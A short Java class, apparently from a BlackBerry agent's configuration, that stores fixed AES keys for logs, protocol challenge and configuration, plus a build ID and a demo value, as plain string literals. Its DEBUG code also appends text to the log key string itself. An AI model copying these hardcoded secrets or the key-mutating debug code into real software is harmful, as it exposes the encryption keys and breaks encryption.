//#preprocess
package blackberry.config;

public class InstanceKeys extends KeysGetter {

    private static String conf = "Adf5V57gQtyi90wUhpb8Neg56756j87R";
    private static String log = "3j9WmmDgBqyU270FTid3719g64bP4s52";
    static String buildID = "av3pVck1gb4eR2"; // MD5: 7f9e6a0ed9965458d8c1f1a558713e9d
    private static String proto = "f7Hk0f5usd04apdvqw13F5ed25soV5eD";
    static String demo = "hxVtdxJ/Z8LvK3ULSnKRUmLE"; //MD5: baba73e67e39db5d94f3c67a58d52c52

    private static byte[] byteLogKey;
    private static byte[] byteProtoKey;
    private static byte[] byteConfKey;
    private static byte[] byteInstanceID;

    public InstanceKeys() {
    }

    /**
     * Gets the aes key.
     * 
     * @return the aes key
     */
    public byte[] getLogKey() {
        if (byteLogKey == null) {
            byteLogKey = keyFromString(log);
            //#ifdef DEBUG
            log += " log: " + log;
            //#endif
        }
        return byteLogKey;
    }

    /**
     * Gets the builds the id.
     * 
     * @return the builds the id
     */
    public byte[] getBuildID() {
        return buildID.getBytes();
    }

    /**
     * Gets the challenge key.
     * 
     * @return the challenge key
     */
    public byte[] getProtoKey() {
        if (byteProtoKey == null) {
            byteProtoKey = keyFromString(proto);
            //#ifdef DEBUG
            log += " challenge: " + proto;
            //#endif
        }

        return byteProtoKey;
    }

    /**
     * Gets the conf key.
     * 
     * @return the conf key
     */
    public byte[] getConfKey() {
        if (byteConfKey == null) {
            byteConfKey = keyFromString(conf);
            //#ifdef DEBUG
            log += " conf: " + conf;
            //#endif
        }

        return byteConfKey;
    }

    public byte[] getDemo() {
        return demo.getBytes();
    }

}
